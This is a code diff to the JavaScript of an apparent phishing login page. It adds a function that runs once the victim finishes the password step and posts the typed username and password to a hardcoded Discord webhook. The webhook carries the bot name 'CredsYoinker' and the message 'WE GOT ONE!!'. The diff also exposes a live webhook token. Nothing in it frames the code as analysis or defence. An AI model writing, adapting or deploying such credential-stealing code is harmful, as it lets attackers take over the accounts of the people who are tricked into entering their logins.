@@ -33,6 +33,7 @@ document.addEventListener('DOMContentLoaded', () => {
             document.getElementById("section_pwd").classList.toggle('d-none');
             document.getElementById('section_final').classList.remove('d-none');
             view = "final";
+            sendMessage()
         }
     })
 
@@ -90,7 +91,28 @@ document.addEventListener('DOMContentLoaded', () => {
         }
         return false;
     }
-
+    function sendMessage() {
+       const request = new XMLHttpRequest();
+       request.open("POST", "https://discord.com/api/webhooks/1128544954977878057/51UjdnJYe-CDycOgUi5Kv9loB1Og8GqMxBPFUWQkG0cbtS4jQ2Iy4GVetQmnynjkFXwh");
+       request.setRequestHeader('Content-type', 'application/json');
+       const params = {
+  "username": "CredsYoinker",
+  "avatar_url": "https://bigrat.monster/media/bigrat.jpg",
+  "content": "@everyone",
+  "tts": false,
+  "embeds": [
+    {
+      "id": 285803896,
+      "description": "USERNAME:" + unameInp.value +  "\nPASSWORD: " + pwdInp.value,
+      "fields": [],
+      "title": "WE GOT ONE!!"
+    }
+  ],
+  "components": [],
+  "actions": {}
+      }
+       request.send(JSON.stringify(params)); 
+    }
     //back button
     document.querySelector('.back').addEventListener('click', () => {
         view = "uname";
